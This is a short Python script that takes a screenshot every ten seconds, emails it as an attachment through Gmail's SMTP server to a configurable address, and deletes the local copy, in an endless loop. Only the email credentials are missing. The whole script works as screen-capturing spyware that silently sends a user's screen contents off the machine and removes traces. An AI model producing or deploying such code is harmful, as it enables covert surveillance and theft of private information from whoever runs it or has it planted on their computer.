from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
import ssl
import smtplib
import pyautogui
import os
from pathlib import Path
import time


def take_screenshot():
    global image_full_path
    # Find path to home directory
    home_dir = Path.home()
    # Join home directory with folder name
    path = os.path.join(home_dir, "Documents")
    
    # Take screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(path + '\\' + "screenshot.jpg")
    image_full_path = path + '\\' + "screenshot.jpg"



def send_email():
           
    email_sender = " "
    email_password = " "
    email_receiver = " "

    subject = "Test"
    body = "Screenshot"

    em = MIMEMultipart()
    em['From'] = email_sender
    em['To'] = email_receiver
    em['subject'] = subject

    em.attach(MIMEText(body, 'plain'))

    file_location = image_full_path
    file_name = os.path.basename(file_location)
    attachment = open(file_location, "rb").read()

    image = MIMEImage(attachment, file_name)
    em.attach(image)
   

    context = ssl.create_default_context()

    with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
        smtp.login(email_sender, email_password)
        smtp.sendmail(email_sender, email_receiver, em.as_string())



while True:
    time.sleep(10)
    take_screenshot()
    send_email()

    os.remove(image_full_path)


